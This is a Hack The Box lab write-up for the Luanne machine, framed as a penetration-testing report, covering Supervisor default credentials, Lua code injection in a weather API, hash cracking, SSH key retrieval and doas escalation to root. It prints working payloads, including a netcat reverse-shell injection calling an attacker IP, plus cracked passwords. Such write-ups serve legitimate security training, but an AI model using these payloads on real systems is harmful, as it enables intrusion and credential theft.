---
title: "OffSec Assessment: Luanne (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Luanne (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_01.png"
---

# Offensive Security Assessment Report: Luanne

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Luanne** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Lua Code Injection (weather.lua)
* **Privilege Escalation Vector:** doas + encrypted backup password
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Luanne |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Easy |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Lua Code Injection (weather.lua) |
| **Privilege Escalation Vector** | doas + encrypted backup password |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Lua Code Injection (weather.lua)
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: doas + encrypted backup password
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

---

### Phase 1: Reconnaissance & Port Scanning

El escaneo revela 3 puertos TCP abiertos: 22 (SSH), 80 (Nginx/bozohttpd) y 9001 (Medusa/Supervisor).


![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.


### Phase 2: Vulnerability Analysis & Attack Surface Mapping

En el puerto 9001 corre **Supervisor Process Manager**, accesible con default credentials `user:123`. Desde el panel se observan dos instancias de bozohttpd: produccion (puerto 3000) y desarrollo (puerto 3001).


![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.


Las default credentials de Supervisor son `user:123`.


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.


En el puerto 80, la ruta `/weather` ejecuta un script Lua llamado **weather.lua** a traves del proceso httpd.


![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.


### Phase 3: Exploitation & Initial Foothold

Fuzzing revela que `/weather/forecast` devuelve HTTP 200. El parametro **city** es vulnerable to **Lua Code Injection**.


![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


Inyectando `os.execute()` en el parametro city, se obtiene ejecucion de comandos y una reverse shell como `_httpd`.


![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.


## Movimiento Lateral

En `.htpasswd` se encuentra el hash de **webapi_user**, que se crackea con john obteniendo: **iamthebest**.


![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.


El flag `-u` de bozohttpd expone los home directories de los usuarios. Accediendo al servidor de desarrollo (puerto 3001) con las credenciales de webapi_user, se accede a `/~r.michaels/` y se obtiene su clave privada SSH.

#### User Proof Flag Verification


![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_12.png)
* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_13.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_13.png)
* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.


### Phase 4: Local Privilege Escalation & Host Dominance

En el home de r.michaels hay un backup encriptado. Se descifra con **netpgp** (herramienta de NetBSD equivalente a gpg).


![step_14.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_14.png)
* **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_15.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_15.png)
* **Assessment Step 15:** Command execution output, exploit delivery proof, or auxiliary evidence.


Dentro del backup, el `.htpasswd` contiene un hash diferente que se crackea obteniendo: **littlebear**.

```jsx
cd /tmp


mkdir -m 700 /tmp/.gnupg
cp -a /home/r.michaels/.gnupg/* /tmp/.gnupg/
chmod 600 /tmp/.gnupg/*

cp /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc /tmp
cd /tmp
netpgp --decrypt --output=devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
tar xvzf devel_backup-2020-09-16.tar.gz
```


![step_16.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_16.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


En NetBSD no hay `sudo`, se usa **doas**. La configuracion permite a r.michaels ejecutar comandos como root. Usando `doas -u root sh` con la contrasena `littlebear`, se obtiene shell como root.

#### Root / System Proof Flag Verification


![step_17.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_17.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.


> 
> 
> 
> ## 🛠️ HTB – Luanne (writeup con comandos explicados)
> 
> ---
> 
> ### **1️⃣ Enumeración inicial**
> 
> Escaneo de puertos:
> 
> ```bash
> bash
> CopiarEditar
> ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.218 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
> nmap -p$ports -sC -sV 10.10.10.218
> 
> ```
> 
> - Encuentra:
>     - **22/tcp** → SSH
>     - **80/tcp** → Nginx
>     - **9001/tcp** → Medusa Supervisor Process Manager
> 
> ---
> 
> ### **2️⃣ Acceso a Supervisor**
> 
> Buscar default credentials en Google → `user:123`.
> 
> ```bash
> bash
> CopiarEditar
> # Abrir navegador o curl
> curl -u user:123 http://10.10.10.218:9001
> 
> ```
> 
> - Accede al panel de Supervisor y vemos procesos en ejecución.
> - Dos instancias `bozohttpd`:
>     - `3000` producción → `/var/www`
>     - `3001` desarrollo → `/home/r.michaels/devel/www`
> 
> ---
> 
> ### **3️⃣ Descubrimiento de la API**
> 
> Fuzzing de rutas en `/weather`:
> 
> ```bash
> bash
> CopiarEditar
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ
> 
> ```
> 
> - Encuentra `/forecast`.
>     
>     Probar endpoint:
>     
> 
> ```bash
> bash
> CopiarEditar
> curl "http://10.10.10.218/weather/forecast?city=list"
> curl "http://10.10.10.218/weather/forecast?city=London"
> 
> ```
> 
> ---
> 
> ### **4️⃣ Exploit – Lua Code Injection**
> 
> Probar ejecución de comandos:
> 
> ```bash
> bash
> CopiarEditar
> curl "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
> 
> ```
> 
> Si funciona, obtenemos reverse shell:
> 
> ```bash
> bash
> CopiarEditar
> # En atacante:
> nc -lvp 4444
> 
> # En víctima vía inyección:
> curl "http://10.10.10.218/weather/forecast?city=')+os.execute('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+4444+>/tmp/f')+--"
> 
> ```
> 
> - Acceso como `_httpd`.
> 
> ---
> 
> ### **5️⃣ Movimiento lateral**
> 
> Encontrar credenciales en `.htpasswd`:
> 
> ```bash
> bash
> CopiarEditar
> cat /var/www/.htpasswd
> 
> ```
> 
> Crackear hash:
> 
> ```bash
> bash
> CopiarEditar
> echo "webapi_user:\$1\$vVoNCsOl\$lMtBS6GL2upDbR4Owhzyc0" > hash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
> # Scan Outcome: iamthebest
> 
> ```
> 
> ---
> 
> ### **6️⃣ Acceso a servidor de desarrollo**
> 
> Probar login:
> 
> ```bash
> bash
> CopiarEditar
> curl --user webapi_user:iamthebest localhost:3001
> 
> ```
> 
> - Vulnerabilidad Lua parcheada.
> - Revisar config → `u` en bozohttpd permite `/~usuario/`.
> 
> Listar home público:
> 
> ```bash
> bash
> CopiarEditar
> curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
> curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
> 
> ```
> 
> Guardar clave y conectar:
> 
> ```bash
> bash
> CopiarEditar
> chmod 600 id_rsa
> ssh -i id_rsa r.michaels@10.10.10.218
> 
> ```
> 
> ---
> 
> ### **7️⃣ Desencriptar backup**
> 
> Listar:
> 
> ```bash
> bash
> CopiarEditar
> ls /home/r.michaels/backups
> # devel_backup-2020-09-16.tar.gz.enc
> 
> ```
> 
> Ver claves:
> 
> ```bash
> bash
> CopiarEditar
> ls /home/r.michaels/.gnupg
> # pubring.gpg secring.gpg
> 
> ```
> 
> Usar `netpgp`:
> 
> ```bash
> bash
> CopiarEditar
> cp /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc /tmp
> NETPGP_HOME=/home/r.michaels/.gnupg \
> netpgp --decrypt --output=/tmp/devel_backup-2020-09-16.tar.gz /tmp/devel_backup-2020-09-16.tar.gz.enc
> tar -xzvf /tmp/devel_backup-2020-09-16.tar.gz -C /tmp
> 
> ```
> 
> ---
> 
> ### **8️⃣ Encontrar nueva contraseña**
> 
> En backup:
> 
> ```bash
> bash
> CopiarEditar
> cat /tmp/devel-2020-09-16/www/.htpasswd
> # webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
> 
> ```
> 
> Crackear:
> 
> ```bash
> bash
> CopiarEditar
> echo "webapi_user:\$1\$6xc7I/LW\$WuSQCS6n3yXsjPMSmwHDu." > hash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
> # Scan Outcome: littlebear
> 
> ```
> 
> ---
> 
> ### **9️⃣ Escalada con doas**
> 
> Comprobar config:
> 
> ```bash
> bash
> CopiarEditar
> cat /etc/doas.conf
> # permit r.michaels as root
> 
> ```
> 
> Elevar privilegios:
> 
> ```bash
> bash
> CopiarEditar
> doas -u root sh
> # Pass: littlebear
> 
> ```
> 
> Ya como root:
> 
> ```bash
> bash
> CopiarEditar
> cat /root/root.txt
> 
> ```
> 
> ---
> 
> ### 📌 Claves del proceso
> 
> - **Supervisor default credentials** → visibilidad de procesos internos.
> - **bozohttpd + Lua vulnerable** → RCE.
> - **Flag `u`** en bozohttpd → exposición de home público y `id_rsa`.
> - **netpgp** usado en lugar de gpg para descifrar backup.
> - **doas** en NetBSD como alternativa a sudo → root.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Lua Code Injection (weather.lua)) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (doas + encrypted backup password) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
